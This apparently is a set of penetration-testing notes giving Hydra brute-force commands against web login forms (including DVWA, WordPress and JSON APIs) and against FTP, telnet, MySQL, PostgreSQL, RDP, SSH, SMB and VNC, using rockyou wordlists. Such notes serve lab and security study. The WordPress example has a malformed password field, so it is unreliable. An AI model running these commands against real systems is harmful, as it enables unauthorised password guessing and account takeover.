#### Hydra URL Forms

![[Pasted image 20220912111730.png]]
```bash - kali
hydra $TARGET -s 80 http-get / -l $USER -P /usr/share/wordlists/rockyou.txt -vV -f -t 3
```

![[Pasted image 20220418151122.png | 750]]

The above form, part of the <u>/form/login.html page</u>, indicates that the POST request is handled by <u>/form/frontpage.php</u>, which is the URL we will feed to Hydra.  Since we are attacking the admin user login with a wordlist, the combined argument to Hydra becomes:  ==(IS IT "http-form-post" OR "http-post-form")?==

```bash - kali
hydra $TARGET -s 80 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f -t 3
```

If you get multiple results:
![[Pasted image 20220927182529.png]]

Try adding a cookie, like:
```bash - kali
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 targets.local http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=$PHPSESSID"
```

OTHER EXAMPLES:
```bash - kali
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET -s 8081 http-post-form "/login.php:user=admin&pass=^PASS^:Invalid Password!" -t 3
```

```bash - kali
hydra -l none -P rockyou.txt $TARGET http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
```

```bash - kali
hydra -L users -p passwords -t 10 $TARGET http-get-form "/ajax.php:fun=login&username=^USER^&password=^PASS^:invalid user" -f -t 3
```

```bash - kali
hydra -l $USER -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt $TARGET -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -f -t 3
```

```bash - kali
hydra -L users -P /usr/share/wordlists/rockyou.txt -s 80 $TARGET http-post-form "/login:{'username'\:'^USER^','password'\:'^PASS^'}:failed" -f -t 3
```

==Lower the number of tasks in parallel, if having issues (Default is 16).==
```bash - kali
-t 3
```

### Hydra against JSON:
```bash - kali
hydra -l $USER -P /usr/share/wordlists/rockyou.txt $TARGET -s 3000 http-post-form "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authenticatio n failed:H=Content-Type\: application/json" -t 64
```

#### Hydra against FTP
```bash - kali
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET ftp -vvv -f -s 21 -t 3
```

#### Hydra against telnet
```bash - kali
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET telnet -vvv -f -s 23 -t 3
```

#### Hydra against MySQL
```bash - kali
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET mysql -vvv -f -s 3306 -t 3
```

#### Hydra against Postgresql
```bash - kali
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET postgres -vvv -f -s 5437 -t 3
```

#### Hydra against RDP
```bash - kali
hydra -l blake -P /usr/share/wordlists/rockyou.txt $TARGET rdp -vvv -f -s 3389 -t 3
```

#### Hydra against SSH
```bash - kali
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET ssh -vvv -f -s 22 -t 3
```

#### Hydra against SMB
```bash - kali
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET smb -vvv -f -s 445 -t 3
```

#### Hydra against VNC
```bash - kali
hydra -P /usr/share/wordlists/rockyou.txt $TARGET vnc -vvv -f -s 5900 -t 3
```


#### Hydra against WordPress
```bash
hydra -vV -L users -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form '/wordpress/wp-login.php:log=^USER^&pwd&wp-submit=Log+In:F=is incorrect' -f -t 3
```